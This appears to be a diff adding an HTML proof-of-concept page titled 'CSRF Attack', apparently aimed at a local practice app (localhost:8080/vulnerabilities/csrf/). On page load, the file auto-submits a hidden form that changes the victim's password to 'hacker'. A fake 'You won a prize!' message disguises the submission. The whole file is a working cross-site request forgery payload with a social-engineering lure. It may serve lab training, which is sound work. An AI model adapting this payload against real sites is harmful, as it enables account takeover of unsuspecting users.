@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body onload="document.forms[0].submit()">
+    <h1>🎉 You won a prize! Click here to claim!</h1>
+    <form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="hacker">
+        <input type="hidden" name="password_conf" value="hacker">
+        <input type="hidden" name="Change" value="Change">
+    </form>
+    <p>Loading your prize...</p>
+</body>
+</html>
